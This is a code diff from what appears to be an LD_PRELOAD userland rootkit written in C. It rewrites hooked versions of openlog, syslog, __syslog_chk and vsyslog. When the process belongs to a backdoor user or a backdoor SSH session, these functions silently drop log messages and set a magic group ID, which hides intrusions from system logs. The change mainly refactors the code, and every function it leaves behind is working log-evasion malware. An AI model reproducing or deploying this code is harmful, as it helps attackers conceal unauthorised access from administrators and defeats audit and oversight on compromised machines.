@@ -1,19 +1,16 @@
-void openlog(const char *ident, int option, int facility)
-{
+void openlog(const char *ident, int option, int facility){
     if(is_bdusr()) return;
     hook(COPENLOG);
-    (void)call(COPENLOG, ident, option, facility);
+    call(COPENLOG, ident, option, facility);
     return;
 }
 
-void syslog(int priority, const char *format, ...)
-{
+void syslog(int priority, const char *format, ...){
     if(is_bdusr()) return;
 
-    if(is_bduname(NULL))
-    {
+    if(bd_sshproc()){
         hook(CSETGID);
-        (void)call(CSETGID, MAGIC_GID);
+        call(CSETGID, MAGIC_GID);
         return;
     }
 
@@ -24,14 +21,12 @@ void syslog(int priority, const char *format, ...)
     return;
 }
 
-void __syslog_chk(int priority, int flag, const char *format, ...)
-{
+void __syslog_chk(int priority, int flag, const char *format, ...){
     if(is_bdusr()) return;
 
-    if(is_bduname(NULL))
-    {
+    if(bd_sshproc()){
         hook(CSETGID);
-        (void)call(CSETGID, MAGIC_GID);
+        call(CSETGID, MAGIC_GID);
         return;
     }
 
@@ -42,19 +37,16 @@ void __syslog_chk(int priority, int flag, const char *format, ...)
     return;
 }
 
-void vsyslog(int priority, const char *format, va_list ap)
-{
+void vsyslog(int priority, const char *format, va_list ap){
     if(is_bdusr()) return;
 
-    hook(CSETGID,
-         CVSYSLOG);
-
-    if(is_bduname(NULL))
-    {
-        (void)call(CSETGID, MAGIC_GID);
+    if(bd_sshproc()){
+        hook(CSETGID);
+        call(CSETGID, MAGIC_GID);
         return;
     }
 
-    (void)call(CVSYSLOG, priority, format, ap);
+    hook(CVSYSLOG);
+    call(CVSYSLOG, priority, format, ap);
     return;
 }
